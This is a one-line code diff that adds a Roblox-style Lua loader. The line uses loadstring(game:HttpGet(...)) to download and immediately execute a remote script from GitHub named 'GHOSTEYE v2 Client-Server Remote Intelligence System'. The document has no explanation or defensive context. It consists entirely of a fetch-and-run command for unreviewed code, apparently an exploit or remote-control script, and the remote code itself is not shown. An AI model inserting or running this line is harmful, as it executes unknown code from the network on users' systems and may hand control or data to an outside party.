@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/1Ns-off/Script-Hosting/refs/heads/main/GHOSTEYE%20v2%20Client-Server%20Remote%20Intelligence%20System.lua"))()
